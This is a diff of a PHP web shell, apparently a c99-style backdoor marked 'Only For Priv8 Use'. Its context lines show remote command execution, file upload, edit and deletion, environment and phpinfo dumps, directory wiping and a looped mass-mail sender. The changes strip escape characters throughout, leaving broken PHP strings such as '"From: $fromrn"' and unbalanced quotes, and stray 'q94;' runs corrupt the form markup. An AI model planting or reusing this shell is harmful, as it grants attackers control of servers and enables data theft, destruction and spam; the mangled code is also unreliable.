@@ -1,4 +1,4 @@
-<?PHP
+<?php
 /*
 ver=5
 ----------------------Only For Priv8 Use---------------------------------
@@ -34,7 +34,7 @@ $of="Netplayazz";
 ($made_by=="Bl0od3r") ? $fake=0 : $fake=1;
 ($of=="dc3") ? $fake=0 : $fake=1;
 $st_dir=".";
-$p=str_replace("\\","/",realpath($_GET['file']));
+$p=str_replace("\","/",realpath($_GET['file']));
 $j_d=$_GET['file'];
 $j_f=$_GET['file'];
 $filename = $_GET['file'];
@@ -217,7 +217,7 @@ header("Last-Modified: ".date("r",filemtime(__FILE__)));
 echo base64_decode($images[$_GET['pic']]);
 }
 
-$ps=str_replace("\\","/",getenv('DOCUMENT_ROOT'));
+$ps=str_replace("\","/",getenv('DOCUMENT_ROOT'));
 //file_array
 $file_tps=array(
 "img"=>array("jpg","bmp","gif","ico"),
@@ -226,7 +226,7 @@ $file_tps=array(
 );
 $surl_autofill_include = true; //If true then search variables with descriptors (URLs) and save it in SURL.
 
-if ($surl_autofill_include and !$_REQUEST["c99sh_surl"]) {$include = "&"; foreach (explode("&",getenv("QUERY_STRING")) as $v) {$v = explode("=",$v); $name = urldecode($v[0]); $value = urldecode($v[1]); foreach (array("http://","https://","ssl://","ftp://","\\\\") as $needle) {if (strpos($value,$needle) === 0) {$includestr .= urlencode($name)."=".urlencode($value)."&";}}} if ($_REQUEST["surl_autofill_include"]) {$includestr .= "surl_autofill_include=1&";}}
+if ($surl_autofill_include and !$_REQUEST["c99sh_surl"]) {$include = "&"; foreach (explode("&",getenv("QUERY_STRING")) as $v) {$v = explode("=",$v); $name = urldecode($v[0]); $value = urldecode($v[1]); foreach (array("http://","https://","ssl://","ftp://","\\") as $needle) {if (strpos($value,$needle) === 0) {$includestr .= urlencode($name)."=".urlencode($value)."&";}}} if ($_REQUEST["surl_autofill_include"]) {$includestr .= "surl_autofill_include=1&";}}
 if (empty($surl))
 {
 $surl = "?".$includestr; //Self url
@@ -324,7 +324,7 @@ echo "".$used_f."";
 }
 }
 $sys=strtolower(substr(PHP_OS,0,3));
-echo "<center><table border=\"1\" width=600 rules=\"groups\">
+echo "<center><table border="1" width=600 rules="groups">
 
 <thead>
 <tr><td>";
@@ -455,9 +455,9 @@ background-color: #8B8989;
 }
 * html ul#Navigation { /* Korrekturen fuer IE 5.x */
 width: 11.6em;
-w\idth: 10em;
+width: 10em;
 padding-left: 0;
-padd\ing-left: 0.8em;
+padding-left: 0.8em;
 }
 ul#Navigation li {
 list-style: none;
@@ -474,7 +474,7 @@ color: black; background-color: #8B8989;
 }
 * html ul#Navigation a { /* Breitenangaben nur fuer IE */
 width: 100%;
-w\idth: 8.8em;
+width: 8.8em;
 }
 ul#Navigation a:hover {
 border-color: white;
@@ -550,7 +550,7 @@ if (!function_exists(send_mail)) {
 function send_mail($from,$to,$text,$subject,$times) {
 while ($i<$times) {
 $i++;
-$header = "From: $from\r\n";
+$header = "From: $fromrn";
 @mail($to, $subject, $text, $header) or die ("[-]Error sending mail(s)!");
 
 }
@@ -640,14 +640,14 @@ echo "Successfully cleared directory!";
 
 
 if (isset($_GET['update'])) {
-echo "<center><table border=\"1\" rules=\"groups\">
+echo "<center><table border="1" rules="groups">
 <thead>
 <tr><td>";
 check_update();
 exit;
 }
 if (isset($_GET['rmdir'])) {
-echo "<center><table border=\"1\" rules=\"groups\">
+echo "<center><table border="1" rules="groups">
 
 <thead>
 <tr><td>";
@@ -662,12 +662,12 @@ $uploaddir = urldecode($_POST['file']);
 
 print "<pre>";
 if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir ."/". $_FILES['userfile']['name'])) {
-echo "<center><table border=\"1\" rules=\"groups\">
+echo "<center><table border="1" rules="groups">
 <thead>
 <tr><td>";
 print "Successfully uploadet file(s)!";
 } else {
-echo "<center><table border=\"1\" rules=\"groups\">
+echo "<center><table border="1" rules="groups">
 <thead>
 <tr><td>";
 print "[-]Error";
@@ -676,7 +676,7 @@ exit;
 }
 
 if (isset($_GET['search'])) {
-echo "<center><table border=\"1\" rules=\"groups\">
+echo "<center><table border="1" rules="groups">
 <thead>
 
 <tr><td>";
@@ -688,7 +688,7 @@ exit;
 
 
 if (isset($_GET['getenv'])) {
-echo "<center><table border=\"1\" width=600 rules=\"groups\">
+echo "<center><table border="1" width=600 rules="groups">
 <thead><br>
 <tr><td>";
 echo getenv($_GET['getenv']);
@@ -697,7 +697,7 @@ exit;
 
 
 if (isset($_GET['php_info'])) {
-echo "<center><table border=\"1\" width=600 rules=\"groups\">
+echo "<center><table border="1" width=600 rules="groups">
 <thead><br>
 <tr><td>";
 phpinfo();
@@ -705,7 +705,7 @@ exit;
 }
 
 if (isset($_GET['defined_vars'])) {
-echo "<center><table border=\"1\" width=600 rules=\"groups\">
+echo "<center><table border="1" width=600 rules="groups">
 <thead><br>
 <tr><td>";
 echo "<center><textarea rows=40 cols=120>";
@@ -717,7 +717,7 @@ exit;
 }
 
 if (isset($_GET['env'])) {
-echo "<center><table border=\"1\" width=600 rules=\"groups\">
+echo "<center><table border="1" width=600 rules="groups">
 
 <thead><br>
 <tr><td>";
@@ -737,7 +737,7 @@ exit;
 
 
 if (isset($_GET['special_crypt'])) {
-echo "<center><table border=\"1\" width=600 rules=\"groups\">
+echo "<center><table border="1" width=600 rules="groups">
 <thead><br>
 <tr><td>";
 echo "<textarea rows=15 cols=90>";
@@ -791,7 +791,7 @@ file: <input name="userfile" type="file"><br><br>
 exit;
 }
 if (isset($_GET['crypt'])) {
-echo "<center><table border=\"1\" width=600 rules=\"groups\">
+echo "<center><table border="1" width=600 rules="groups">
 <thead><br>
 <tr><td>";
 ?>
@@ -823,7 +823,7 @@ exit;
 }
 
 if (isset($_GET['php_code'])) {
-echo "<center><table border=\"1\" width=600 rules=\"groups\">
+echo "<center><table border="1" width=600 rules="groups">
 <thead><br>
 <tr><td>";
 ?>
@@ -848,7 +848,7 @@ exit;
 
 
 if (isset($_GET['rename_all'])) {
-echo "<center><table border=\"1\" width=600 rules=\"groups\">
+echo "<center><table border="1" width=600 rules="groups">
 <thead><br>
 <tr><td>";
 rename_all(urldecode($_POST['d']),$_POST['prefix'],$_POST['name'],$_POST['del']);
@@ -856,7 +856,7 @@ exit;
 }
 
 if (isset($_GET['special_d'])) {
-echo "<center><table border=\"1\" width=600 rules=\"groups\">
+echo "<center><table border="1" width=600 rules="groups">
 <thead><br>
 <tr><td>";
 $way=$_POST['way'];
@@ -865,7 +865,7 @@ clear_dir($_GET['file']);
 exit;
 }
 if ($way=="2") {
-echo "<center><table border=\"1\" width=600 rules=\"groups\">
+echo "<center><table border="1" width=600 rules="groups">
 <thead><br>
 
 <tr><td>";
@@ -883,7 +883,7 @@ exit;
 
 
 if (isset($_GET['special_dir'])) {
-echo "<center><table border=\"1\" width=600 rules=\"groups\">
+echo "<center><table border="1" width=600 rules="groups">
 <thead><br>
 <tr><td>";
 ?>
@@ -898,7 +898,7 @@ exit;
 
 if (isset($_GET['delete'])) {
 if (@file_exists($filename)) {
-echo "<center><table border=\"1\" width=600 rules=\"groups\">
+echo "<center><table border="1" width=600 rules="groups">
 <thead>
 <tr><td>";
 @unlink($filename) or die ("[-]Error deleting file!");
@@ -908,7 +908,7 @@ exit;
 }
 
 if (isset($_GET['save'])) {
-echo "<center><table border=\"1\" width=600 rules=\"groups\">
+echo "<center><table border="1" width=600 rules="groups">
 
 <thead>
 <tr><td>";
@@ -918,7 +918,7 @@ exit;
 }
 
 if (isset($_GET['exec'])) {
-echo "<center><table border=\"1\" width=600 rules=\"groups\">
+echo "<center><table border="1" width=600 rules="groups">
 <thead>
 <tr><td><center>";
 @chdir(urldecode($_POST['dir']));
@@ -931,7 +931,7 @@ exit;
 
 if (isset($_GET['mkdir'])) {
 if (isset($_POST['name'])) {
-echo "<center><table border=\"1\" rules=\"groups\">
+echo "<center><table border="1" rules="groups">
 <thead>
 <tr><td>";
 mkdir(urldecode($_POST['dir'])."/".$_POST['name']) or die ("[-]Error creating dir!");
@@ -942,7 +942,7 @@ exit;
 
 if (isset($_GET['mkfile'])) {
 if (isset($_POST['name'])) {
-echo "<center><table border=\"1\" rules=\"groups\">
+echo "<center><table border="1" rules="groups">
 
 <thead>
 <tr><td>";
@@ -960,7 +960,7 @@ exit;
 }
 
 if (isset($_GET['edit'])) {
-echo "<center><table border=\"1\" width=600 rules=\"groups\">
+echo "<center><table border="1" width=600 rules="groups">
 <thead>
 <tr><td>";
 if (@file_exists($filename)) {
@@ -974,7 +974,7 @@ exit;
 
 
 if (isset($_GET['copy_start'])) {
-echo "<center><table border=\"1\" width=600 rules=\"groups\">
+echo "<center><table border="1" width=600 rules="groups">
 <thead>
 <tr><td>";
 copy_file($_POST['from'],$_POST['to']);
@@ -984,7 +984,7 @@ exit;
 
 
 if (isset($_GET['copy_file'])) {
-echo "<center><table border=\"1\" width=600 rules=\"groups\">
+echo "<center><table border="1" width=600 rules="groups">
 
 <thead>
 <tr><td>";
@@ -998,7 +998,7 @@ exit;
 }
 
 if (isset($_GET['send_mail_st'])) {
-echo "<center><table border=\"1\" width=600 rules=\"groups\">
+echo "<center><table border="1" width=600 rules="groups">
 <thead>
 
 <tr><td>";
@@ -1021,7 +1021,7 @@ exit;
 }
 }
 if (isset($_GET['send_mail'])) {
-echo "<center><table border=\"1\" width=600 rules=\"groups\">
+echo "<center><table border="1" width=600 rules="groups">
 <thead>
 <tr><td>";
 ?>
@@ -1040,7 +1040,7 @@ if (isset($_GET['file_browser'])) {
 
 for ($i=0;$i<4;$i++) {
 if (preg_match("/".$file_tps["img"][$i]."/i",$extn)) {
-echo "<center><table border=\"1\" rules=\"groups\">
+echo "<center><table border="1" rules="groups">
 <thead>
 <tr><td>";
 echo "<a href=".$surl."?&".$word."&file_browser&file=".urlencode($filename)."&img><img src='".urldecode($surl)."?&".$word."&file=".urldecode($filename)."&img' height= width= border=0><br>";
@@ -1050,21 +1050,21 @@ exit;
 
 
 if (@filetype($j_f)=="file") {
-echo "<center><table border=\"1\" rules=\"groups\"
+echo "<center><table border="1" rules="groups"
 <thead>
 <tr><td>";
 highlight_file($j_f);
 
 exit;
 }
-echo "<center><table border=\"1\" rules=\"groups\">
+echo "<center><table border="1" rules="groups">
 <thead>
 <tr>
 
 <th></th><td>";
 count_all($j_d);
 echo "</tr>";
-echo "<center><table border=\"1\" rules=\"groups\">
+echo "<center><table border="1" rules="groups">
 <thead>
 <tr>
 <th>Filename</th><th>Edit</th><th>Copy</th><th>Download</th><th>Delete<th>Perms</th><th>Access</th> ";
@@ -1120,7 +1120,7 @@ get_perms(fileperms($j_f."/".$file));
 echo "</td>";
 echo "</a></td>";
 }
-echo "<center><table width=360 height=40 border=\"1\" rules=\"groups\">
+echo "<center><table width=360 height=40 border="1" rules="groups">
 
 <thead>
 <tr>
@@ -1139,7 +1139,7 @@ echo "<font color=red>[No]</font>";
 </form>
 
 <?php
-echo "</td><center><table width=360 height=40 border=\"1\" rules=\"groups\">
+echo "</td><center><table width=360 height=40 border="1" rules="groups">
 <thead>
 <tr>
 <th></th><td>";
@@ -1151,7 +1151,7 @@ q94;q94;q94;q94;q94;q94;q94;q94;q94;q94;q94;q94;q94;q94;q94;q94;q94;<input type=
 </form>
 <?php
 
-echo "</td><center><table width=360 height=40 border=\"1\" rules=\"groups\">
+echo "</td><center><table width=360 height=40 border="1" rules="groups">
 <thead>
 
 <tr>
@@ -1168,7 +1168,7 @@ echo "<font color=green>[Ok]</font>";
 } else {
 echo "<font color=red>[No]</font>";
 }
-echo "</td><center><table width=360 height=40 border=\"1\" rules=\"groups\">
+echo "</td><center><table width=360 height=40 border="1" rules="groups">
 
 <thead>
 <tr>
@@ -1185,7 +1185,7 @@ echo "<font color=green>[Ok]</font>";
 } else {
 echo "<font color=red>[No]</font>";
 }
-echo "</td><center><table width=360 height=40 border=\"1\" rules=\"groups\">
+echo "</td><center><table width=360 height=40 border="1" rules="groups">
 
 <thead>
 <tr>
@@ -1197,7 +1197,7 @@ command: <input name="command" type="text">
 q94;q94;q94;q94;q94;q94;q94;q94;q94;q94;q94;q94;q94;q94;q94;q94;q94;<input type="submit" value="execute">
 </form>
 <?php
-echo "</td><center><table border=\"1\" rules=\"groups\">
+echo "</td><center><table border="1" rules="groups">
 <thead>
 <tr>
 
